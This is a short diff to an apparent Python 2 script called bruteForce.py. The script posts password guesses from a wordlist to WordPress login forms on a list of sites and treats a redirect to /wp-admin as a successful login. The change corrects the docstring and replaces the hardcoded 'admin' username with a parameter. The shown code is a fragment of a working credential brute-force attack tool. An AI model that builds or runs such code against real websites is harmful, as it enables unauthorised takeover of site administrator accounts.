@@ -4,7 +4,7 @@
 #
 
 """
-dorkScanner.py, find sites from dorks.
+bruteForce.py, try to login websites with admin:password.
 
 Usage:
 	~$ python2 bruteForce.py sites.txt pwds.txt
@@ -28,7 +28,7 @@ def brute(site, username="admin", control=False):
 
 	for pwd in passwords:
 		try:
-			payload = {"log": "admin", "pwd": pwd}
+			payload = {"log": username, "pwd": pwd}
 			req = requests.post(site, data=payload, timeout=5)
 			
 			if '/wp-admin' in req.url:
